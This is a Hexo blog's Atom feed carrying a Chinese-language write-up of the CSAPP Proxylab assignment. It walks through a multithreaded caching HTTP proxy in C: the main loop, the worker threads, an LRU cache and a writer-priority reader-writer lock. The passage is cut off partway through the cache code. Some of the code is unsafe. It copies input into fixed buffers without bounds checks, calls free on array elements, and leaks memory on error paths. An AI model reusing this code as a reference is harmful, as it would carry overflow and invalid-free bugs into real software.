<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Raven&#39;s Blog</title>
  
  <subtitle>zhang.xingrui@foxmail.com</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.ravenxrz.ink/"/>
  <updated>2020-09-06T07:50:50.929Z</updated>
  <id>https://www.ravenxrz.ink/</id>
  
  <author>
    <name>Raven</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Csapp-Proxylab题解</title>
    <link href="https://www.ravenxrz.ink/archives/5d2f135a.html"/>
    <id>https://www.ravenxrz.ink/archives/5d2f135a.html</id>
    <published>2020-09-06T04:27:25.000Z</published>
    <updated>2020-09-06T07:50:50.929Z</updated>
    
    <content type="html"><![CDATA[<p>本次lab Proxylab。 也是csapp的最后一个lab。</p><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.实验目的"></a>1.实验目的</h2><p>proxylab, 从最终目的来看，我们实现的是一个代理服务器。proxy接收来client的请求，转发给server，并从server中取得数据后，返回给client。另外，proxy从server中取回数据后还需要做cache，这样，当另一个client请求相同的数据时，就不用从server端请求数据，降低了server的压力。</p><p>再看看一些细节的要求，要求支持多线程请求，多线程涉及一些同步的问题，所以做的时候一定要考虑哪些是互斥资源，用什么方式同步等。</p><a id="more"></a><h2 id="2-个人实现"><a href="#2-个人实现" class="headerlink" title="2.个人实现"></a>2.个人实现</h2><p>下面是整个处理流程图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200906094312362.png" alt="image-20200906094312362"></p><p>client向proxy请求数据，proxy将请求放入到一个任务队列中，交由子线程处理。线程负责参数解析，首先看cache中是否有满足的数据，有则直接返回给client，没有则向server请求，server返回数据后，线程将数据插入到cache中，并返回给client。</p><p>ok，整个处理流程知道后就可以开始写代码了。</p><p><strong>下文不会给出所有代码，具体代码已贴github:</strong></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLWJvb2tzLXNvdXJjZS1jb2Rlcy9jc2FwcF9sYWIvYmxvYi9tYXN0ZXIvcHJveHlsYWIvcHJveHlsYWItaGFuZG91dC9wcm94eS5j" title="https://github.com/raven-books-source-codes/csapp_lab/blob/master/proxylab/proxylab-handout/proxy.c">proxy.c<i class="fa fa-external-link"></i></span></p><h3 id="1-主线程工作"><a href="#1-主线程工作" class="headerlink" title="1. 主线程工作"></a>1. 主线程工作</h3><p>先看看主线程做的工作，主线程的工作相对简单，除了一些必要的初始化工作外，只需要开启socket监听，一旦有新连接就将该连接的文件描述符(fd)放入到任务队列中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> proxy_port[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> client_hostname[BUF_SIZE];</span><br><span class="line">    <span class="keyword">char</span> client_port[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* init */</span></span><br><span class="line">    log_set_level(LOG_INFO);</span><br><span class="line">    sbuf_init(&amp;sbuf, WORKER_NUM * <span class="number">3</span>);</span><br><span class="line">    cache_init(&amp;mycache);</span><br><span class="line">    create_thread_workers(WORKER_NUM);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* parse port from cmd */</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        log_error(<span class="string">"need specify proxy port\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(proxy_port, argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* start listen */</span></span><br><span class="line">    listenfd = Open_listenfd(proxy_port);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = Accept(listenfd, (SA *) &amp;clientaddr, &amp;clientlen);</span><br><span class="line">        Getnameinfo((SA *) &amp;clientaddr, clientlen, client_hostname, BUF_SIZE,</span><br><span class="line">                    client_port, BUF_SIZE, <span class="number">0</span>);</span><br><span class="line">        log_info(<span class="string">"Accepted connection from (%s, %s)\n"</span>, client_hostname,</span><br><span class="line">                 client_port);</span><br><span class="line">        <span class="comment">/* put task into task queue */</span></span><br><span class="line">        sbuf_insert(&amp;sbuf, connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* free resource  */</span></span><br><span class="line">    cache_deinit(&amp;mycache);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-子线程工作"><a href="#2-子线程工作" class="headerlink" title="2. 子线程工作"></a>2. 子线程工作</h3><p>子线程从任务队列中获取一个“任务“，然后doit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">thread_routinue</span><span class="params">(<span class="keyword">void</span> *vargs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> connfd;</span><br><span class="line">    pthread_detach(pthread_self());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line">        doit(connfd);</span><br><span class="line">        <span class="built_in">close</span>(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>doit就复杂些了，因为基本包含了所有工作：</p><ol><li>负责获取client请求</li><li>解析client请求</li><li>转换成可以发送给server的请求</li><li>获取数据，可能从cache中获取，也可能从server中获取</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> src_uri[BUF_SIZE], dest_uri[BUF_SIZE], src_version[BUF_SIZE],</span><br><span class="line">            dest_version[BUF_SIZE], src_headers[BUF_SIZE], dest_headers[BUF_SIZE],</span><br><span class="line">            hostname[BUF_SIZE], server_port[BUF_SIZE];</span><br><span class="line">    <span class="keyword">char</span> *buf = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * BUF_SIZE);</span><br><span class="line">    <span class="keyword">char</span> *request_to_server = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * BUF_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (!buf || !request_to_server) &#123;</span><br><span class="line">        log_error(</span><br><span class="line">                <span class="string">"allocate memory for request which is sending to server faild\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* init */</span></span><br><span class="line">    <span class="built_in">memset</span>(src_uri, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(src_version, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(src_headers, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(hostname, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(request_to_server, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(server_port, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* parse request from client */</span></span><br><span class="line">    <span class="keyword">if</span> (parse_client_request(fd, src_uri, src_version, src_headers, hostname,</span><br><span class="line">                             server_port)) &#123;</span><br><span class="line">        log_error(<span class="string">"parse client request error\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    log_info(<span class="string">"request: %s\n"</span>, src_uri);</span><br><span class="line">    log_info(<span class="string">"http version: %s\n"</span>, src_version);</span><br><span class="line">    log_info(<span class="string">"headers: %s\n"</span>, src_headers);</span><br><span class="line">    log_info(<span class="string">"hostname: %s\n"</span>, hostname);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* convert uri , headers, version to the uri headers version that will be</span></span><br><span class="line"><span class="comment">     * send to server */</span></span><br><span class="line">    <span class="comment">/* append HOSTNAME first */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Host: %s\r\n"</span>, hostname);</span><br><span class="line">    <span class="built_in">strcat</span>(src_headers, buf);</span><br><span class="line">    <span class="keyword">if</span> (convert_request(src_uri, src_headers, src_version, dest_uri,</span><br><span class="line">                        dest_headers, dest_version)) &#123;</span><br><span class="line">        log_error(<span class="string">"convert request failed\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* constrcut request sending to server */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"GET %s %s\r\n"</span>, dest_uri, dest_version);</span><br><span class="line">    <span class="built_in">strcat</span>(request_to_server, buf);</span><br><span class="line">    <span class="built_in">strcat</span>(request_to_server, dest_headers);</span><br><span class="line">    <span class="built_in">strcat</span>(request_to_server, <span class="string">"\r\n"</span>); <span class="comment">/* end of requst */</span></span><br><span class="line">    log_info(<span class="string">"coneverted request to server:\n%s\n"</span>, request_to_server);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* fetch data  */</span></span><br><span class="line">    <span class="comment">/* is data in cache? */</span></span><br><span class="line">    cache_item *ci;</span><br><span class="line">    ci = cache_get(&amp;mycache, dest_uri);</span><br><span class="line">    <span class="keyword">int</span> read_len = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (ci == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* fetch from server*/</span></span><br><span class="line">        <span class="keyword">if</span> ((read_len = fetch_data_from_server(request_to_server,</span><br><span class="line">                                               <span class="built_in">strlen</span>(request_to_server) + <span class="number">1</span>,</span><br><span class="line">                                               hostname, server_port, buf)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            log_error(<span class="string">"fetch data from server failed\n"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        log_info(<span class="string">"fetch data from server sucess %d\n"</span>, read_len);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* save to cache */</span></span><br><span class="line">        log_debug(<span class="string">"put data into cache\n"</span>);</span><br><span class="line">        cache_put(&amp;mycache, dest_uri, buf, read_len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* fetch from cache */</span></span><br><span class="line">        log_debug(<span class="string">"fetch data from cache\n"</span>);</span><br><span class="line">        read_len = ci-&gt;effect_size;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, ci-&gt;data, read_len);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* send data to client */</span></span><br><span class="line">    <span class="keyword">int</span> write_len = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((write_len = send_data_to_client(fd, buf, read_len)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        log_error(<span class="string">"send data to client failed\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    log_info(<span class="string">"send data to client sucess %d\n"</span>, write_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* free resource */</span></span><br><span class="line">    <span class="built_in">free</span>(request_to_server);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个流程就是这样，处理起来不算来。下面我们主要看看整个流程中设计到的一些互斥资源。</p><ol><li>sbuf，互斥队列，这个是csapp提供了，我们可以直接用，内部采用“生产者-消费者”的思想+信号量的实现。</li><li>cache，典型的”读写锁“实现，个人这里采用的是写优先的读写锁信号量实现。</li></ol><h3 id="3-cache的实现"><a href="#3-cache的实现" class="headerlink" title="3. cache的实现"></a>3. cache的实现</h3><p>那下面就说一下cache的实现吧。</p><p>文中定义了cache的最大size和一个object的最大size。为了简单起见，我们按照max object size来分块，然后采用LRU算法来替换cache block。</p><p>首先看看用到的数据结构:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">   <span class="keyword">char</span> key[<span class="number">100</span>] ;     <span class="comment">/* use request uri as key */</span></span><br><span class="line">   <span class="keyword">char</span> data[MAX_OBJECT_SIZE];</span><br><span class="line">   <span class="keyword">size_t</span> effect_size;      <span class="comment">/* effect size */</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> age;      <span class="comment">/* use to implement LRU */</span></span><br><span class="line">&#125;cache_item;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    cache_item *ci;</span><br><span class="line">    <span class="keyword">size_t</span> ci_num;     <span class="comment">/* cache item pair_num */</span></span><br><span class="line">&#125;cache;</span><br></pre></td></tr></table></figure><p>cache_item定义了一个cache block的数据及元数据。</p><p>cache则由多个cache_item组成了。</p><p>然后是要用到的一些函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_init</span><span class="params">(cache *cp)</span></span>;</span><br><span class="line"><span class="comment">/* cache_put */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_put</span><span class="params">(cache *cp, <span class="keyword">char</span> *key, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br><span class="line"><span class="comment">/* cache_get */</span></span><br><span class="line"><span class="function">cache_item *<span class="title">cache_get</span><span class="params">(cache *cp, <span class="keyword">char</span> *key)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_deinit</span><span class="params">(cache *cp)</span></span>;</span><br></pre></td></tr></table></figure><p>接口很简单，就get、put。</p><p>先看看简单的init和deinit：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cache init</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @return 0 sucess</span></span><br><span class="line"><span class="comment"> *         -1 failed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_init</span><span class="params">(cache *cp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!cp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* cache_get cache item pair_num */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> ci_num = MAX_CACHE_SIZE / MAX_OBJECT_SIZE;</span><br><span class="line">    cp-&gt;ci = (cache_item *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_item) * ci_num);</span><br><span class="line">    cp-&gt;ci_num = ci_num;</span><br><span class="line">    <span class="comment">/* init every cache block */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        cp-&gt;ci[i].effect_size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* semaphore init */</span></span><br><span class="line">    sem_init(&amp;rcounter_mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;res_mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;w_mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * deinit</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_deinit</span><span class="params">(cache *cp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!cp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(&amp;cp-&gt;ci[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说get和put之前，先说说读写锁-写优先的操作。</p><ol><li>写-写互斥</li><li>写-读互斥</li><li>读-读共享</li><li>读加锁时，后续有读线程又有写线程时，写线程优先。</li></ol><p>看PV实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> read_counter = <span class="number">0</span>;<span class="comment">// 记录读者数</span></span><br><span class="line"><span class="keyword">sem_t</span> rc_mutex;<span class="comment">// 读者数的操作锁</span></span><br><span class="line"><span class="keyword">sem_t</span> res_mutex;<span class="comment">// 互斥资源锁</span></span><br><span class="line"><span class="keyword">sem_t</span> w_mutex;<span class="comment">// 实现写优先</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写者</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">P(&amp;w_mutex);<span class="comment">// 占用w_mutex, 阻塞读者</span></span><br><span class="line">P(&amp;res_mutex);</span><br><span class="line"><span class="keyword">do</span> <span class="built_in">write</span></span><br><span class="line">V(&amp;res_mutex);</span><br><span class="line">V(&amp;w_mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读着</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">P(&amp;w_mutex);</span><br><span class="line">P(&amp;rc_mutex);</span><br><span class="line">read_counter++;</span><br><span class="line"><span class="keyword">if</span>(read_counter == <span class="number">1</span>)</span><br><span class="line">P(&amp;res_mutex);</span><br><span class="line">V(&amp;rc_mutex);</span><br><span class="line">V(&amp;w_mutex);</span><br><span class="line"><span class="keyword">do</span> <span class="built_in">read</span></span><br><span class="line">P(&amp;rc_mutex);</span><br><span class="line">read_counter--;</span><br><span class="line"><span class="keyword">if</span>(read_counter == <span class="number">0</span>)</span><br><span class="line">V(&amp;res_mutex);</span><br><span class="line">V(&amp;rc_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok, 有了以上基础知识，写cache_get和cache_put就会很简单了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * put data into cache</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @param key</span></span><br><span class="line"><span class="comment"> * @param data</span></span><br><span class="line"><span class="comment"> * @param size</span></span><br><span class="line"><span class="comment"> * @return  0 sucess</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_put</span><span class="params">(cache *cp, <span class="keyword">char</span> *key, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> age_counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> empty_block_idx = <span class="number">-1</span>;</span><br><span class="line">    cache_item *ci;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* write start */</span></span><br><span class="line">    P(&amp;w_mutex);</span><br><span class="line">    P(&amp;res_mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* increment age counter */</span></span><br><span class="line">    age_counter++;</span><br><span class="line">    <span class="comment">/* first try to find an empty block */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cp-&gt;ci[i].effect_size == <span class="number">0</span>) &#123;</span><br><span class="line">            empty_block_idx = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* need evict ?*/</span></span><br><span class="line">    <span class="keyword">if</span> (empty_block_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        empty_block_idx = evict(cp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ci = &amp;cp-&gt;ci[empty_block_idx];</span><br><span class="line">    <span class="built_in">memcpy</span>(ci-&gt;key, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">memcpy</span>(ci-&gt;data, data, <span class="built_in">size</span>);</span><br><span class="line">    ci-&gt;effect_size = <span class="built_in">size</span>;</span><br><span class="line">    ci-&gt;age = age_counter;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* write end*/</span></span><br><span class="line">    V(&amp;res_mutex);</span><br><span class="line">    V(&amp;w_mutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 